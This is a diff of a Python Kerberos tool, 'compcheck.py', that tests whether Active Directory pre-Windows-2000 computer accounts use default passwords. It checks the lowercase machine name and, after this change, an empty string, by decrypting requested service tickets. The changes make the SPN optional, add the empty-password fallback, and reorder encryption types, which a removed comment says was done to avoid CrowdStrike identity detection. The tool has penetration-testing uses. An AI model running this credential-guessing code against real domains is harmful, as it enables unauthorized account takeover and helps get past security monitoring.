@@ -11,12 +11,12 @@ import random
 from pyasn1.type.univ import noValue, Sequence
 
 # Example usage
-# python3 compcheck.py PRE2KCOMPUTER LAB.LOCAL HOST/PRE2KCOMPUTER 192.168.130.2
+# python3 compcheck.py PRE2KCOMPUTER LAB.LOCAL 192.168.130.2 HOST/PRE2KCOMPUTER
+# python3 compcheck.py PRE2KCOMPUTER LAB.LOCAL 192.168.130.2
+
 print("CompCheck... by @_xpn_")
 
-# Updated, the original defaults to RC4 in first order which we don't want.. bloody CrowdStrike IDP!!
-# Also a few other changes like the expiry date, which should be the year 2100
-# Also the flags shouldn't have renewable_ok set in the TGS_REQ
+# Few changes, like the order of the etypes, the expiry date, which should be the year 2100, and flags shouldn't have renewable_ok set in the TGS_REQ
 def getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey):
     
     rand = random.SystemRandom()
@@ -143,8 +143,8 @@ import argparse
 parser = argparse.ArgumentParser(description='Check if a password is valid for a given user')
 parser.add_argument('computer', help='Computer to check')
 parser.add_argument('domain', help='Domain to check')
-parser.add_argument('SPN', help='SPN to check')
 parser.add_argument('kdcHost', help='KDC host to check')
+parser.add_argument('SPN', help='SPN to check', nargs='?')
 args = parser.parse_args()
 
 # Password is usually just the computer name without the dollar and lowercase
@@ -175,9 +175,14 @@ tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
 oldSessionKey = sessionKey
 
 # Get a TGS for the SPN
-print(f"[*] Requesting TGS for SPN {SPN}")
-serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
-r, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
+if SPN == None:
+  print(f"[*] Requesting TGS with principal {username}")
+  serverName = Principal(username, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
+  r, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
+else:   
+  print(f"[*] Requesting TGS for SPN {SPN}")
+  serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
+  r, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
 
 # Parse the TGS
 tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]
@@ -189,12 +194,18 @@ newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
 if newCipher.enctype == Enctype.RC4:
   print("[*] Using RC4")
   key = newCipher.string_to_key(password, '', None)
+  key2 = newCipher.string_to_key('', '', None)
 else:
   print("[*] Using AES")
   key = newCipher.string_to_key(password, domain.upper()+"host"+usernameWithoutDollar.lower()+"."+domain.lower(), None)
+  key2 = newCipher.string_to_key('', domain.upper()+"host"+usernameWithoutDollar.lower()+"."+domain.lower(), None)
 
 try:
   plainText = newCipher.decrypt(key, 2, cipherText)
-  print(f"[***] Decrypted ticket successfully, password is {password}")
+  print(f"[***] Decrypted ticket successfully, password is [{password}]")
 except:
-  print("[!] Failed to decrypt TGS, password was wrong")
+  try:
+    plainText = newCipher.decrypt(key2, 2, cipherText)
+    print(f"[***] Decrypted ticket successfully, password is [''] (empty string)")
+  except:
+    print("[!] Failed to decrypt TGS")
